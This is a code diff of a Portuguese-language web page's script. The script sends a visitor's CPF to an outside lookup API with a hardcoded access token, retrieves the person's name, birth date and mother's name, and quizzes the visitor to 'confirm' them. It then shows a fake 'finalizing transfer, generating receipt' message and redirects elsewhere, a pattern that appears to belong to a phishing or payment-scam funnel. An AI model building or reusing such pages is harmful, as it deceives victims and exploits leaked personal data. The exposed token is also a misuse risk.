@@ -208,91 +208,108 @@
     </div>
 
     <script>
-        let userData = {};
-    const apiUrl = "https://api.arkz.tech/api/cpf/";
+  let userData = {};
 
-    // Etapa 1 - Buscar CPF
-    document.getElementById("cpfBtn").addEventListener("click", async () => {
-      const cpf = document.getElementById("cpfInput").value.trim();
-      if (!cpf) return alert("Digite um CPF válido");
+  const API_TOKEN = "eda7dd28b39f2480fdf204e5a440cdbd8a250528cbf56769d6503a6ee7d8cff8";
+  const API_BASE = "https://api.arkz.tech/api/cpf/";
 
-      try {
-        const response = await fetch(`${apiUrl}${cpf}&token=eda7dd28b39f2480fdf204e5a440cdbd8a250528cbf56769d6503a6ee7d8cff8/${cpf}`);
-        const json = await response.json();
+  document.getElementById("cpfBtn").addEventListener("click", async () => {
+    const cpf = document.getElementById("cpfInput").value.trim();
+    if (!cpf) {
+      alert("Digite um CPF válido");
+      return;
+    }
 
-        if (!json || !json.cpf) {
-          alert("CPF não encontrado.");
-          return;
-        }
+    const apiUrl = `${API_BASE}${cpf}?token=${API_TOKEN}`;
 
-        userData.cpf = json.cpf;
-        userData.nome = json.nome;
-        userData.nascimento = json.nascimento;
-        userData.mae = json.mae;
+    try {
+      const response = await fetch(apiUrl);
+      const json = await response.json();
 
-        gerarOpcoes("birthOptions", json.nascimento, "nascimento");
-
-        document.getElementById("step1").classList.add("hidden");
-        document.getElementById("step2").classList.remove("hidden");
-      } catch (err) {
-        alert("Erro ao consultar CPF");
-      }
-    });
-
-    // Função para gerar opções
-    function gerarOpcoes(containerId, correta, campo) {
-      const container = document.getElementById(containerId);
-      container.innerHTML = "";
-
-      const opcoes = new Set([correta]);
-      while (opcoes.size < 4) {
-        if (campo === "nascimento") {
-          const dia = Math.floor(Math.random() * 28) + 1;
-          const mes = Math.floor(Math.random() * 12) + 1;
-          const ano = Math.floor(Math.random() * 30) + 1970;
-          opcoes.add(`${String(dia).padStart(2, "0")}/${String(mes).padStart(2, "0")}/${ano}`);
-        } else if (campo === "mae") {
-          const nomes = ["Maria Aparecida", "Ana Paula", "Fernanda Silva", "Claudia Souza"];
-          opcoes.add(nomes[Math.floor(Math.random() * nomes.length)]);
-        }
+      if (!json || !json.cpf) {
+        alert("CPF não encontrado.");
+        return;
       }
 
-      if (campo === "mae" && (!correta || correta.trim() === "")) {
-        opcoes.delete("");
-        opcoes.add("Nenhuma das anteriores");
+      userData = {
+        cpf: json.cpf,
+        nome: json.nome,
+        nascimento: json.nascimento,
+        mae: json.mae
+      };
+
+      gerarOpcoes("birthOptions", json.nascimento, "nascimento");
+
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+
+    } catch (err) {
+      console.error(err);
+      alert("Erro ao consultar CPF");
+    }
+  });
+
+  function gerarOpcoes(containerId, correta, campo) {
+    const container = document.getElementById(containerId);
+    container.innerHTML = "";
+
+    const opcoes = new Set([correta]);
+
+    while (opcoes.size < 4) {
+      if (campo === "nascimento") {
+        const dia = Math.floor(Math.random() * 28) + 1;
+        const mes = Math.floor(Math.random() * 12) + 1;
+        const ano = Math.floor(Math.random() * 30) + 1970;
+        opcoes.add(
+          `${String(dia).padStart(2, "0")}/${String(mes).padStart(2, "0")}/${ano}`
+        );
+      } else if (campo === "mae") {
+        const nomes = [
+          "Maria Aparecida",
+          "Ana Paula",
+          "Fernanda Silva",
+          "Claudia Souza"
+        ];
+        opcoes.add(nomes[Math.floor(Math.random() * nomes.length)]);
       }
+    }
 
-      const lista = Array.from(opcoes).sort(() => Math.random() - 0.5);
+    if (campo === "mae" && (!correta || correta.trim() === "")) {
+      opcoes.delete("");
+      opcoes.add("Nenhuma das anteriores");
+    }
 
-      lista.forEach(op => {
+    Array.from(opcoes)
+      .sort(() => Math.random() - 0.5)
+      .forEach(op => {
         const btn = document.createElement("button");
         btn.textContent = op;
         btn.className = "option-btn";
+
         btn.onclick = () => {
-          if (op === correta || (campo === "mae" && (!correta || correta.trim() === "") && op === "Nenhuma das anteriores")) {
+          if (
+            op === correta ||
+            (campo === "mae" && (!correta || correta.trim() === "") && op === "Nenhuma das anteriores")
+          ) {
             if (campo === "nascimento") {
               userData.nascimentoConfirmado = op;
               document.getElementById("step2").classList.add("hidden");
               gerarOpcoes("motherOptions", userData.mae, "mae");
               document.getElementById("step3").classList.remove("hidden");
-            } else if (campo === "mae") {
+            } else {
               userData.maeConfirmada = op;
-
-              // Salvar no localStorage
               localStorage.setItem("userData", JSON.stringify(userData));
 
-              // Mostrar alerta customizado
               const overlay = document.getElementById("alertOverlay");
               const message = document.getElementById("alertMessage");
+
               overlay.classList.add("show");
               message.textContent = "✅ Dados confirmados com sucesso!\nFinalizando transferência...";
-              
-              // Depois de 3 segundos, muda a mensagem para gerando comprovante
+
               setTimeout(() => {
                 message.textContent = "Gerando comprovante...";
               }, 3000);
 
-              // Após 6 segundos totais, redireciona
               setTimeout(() => {
                 window.location.href = "/up3/4";
               }, 6000);
@@ -301,11 +318,12 @@
             alert("Resposta incorreta, tente novamente.");
           }
         };
+
         container.appendChild(btn);
       });
-    }
-    </script>
-</body>
+  }
+</script>
+
 
 <script>
   window.pixelId = "696188d7d2592273a0a03031";
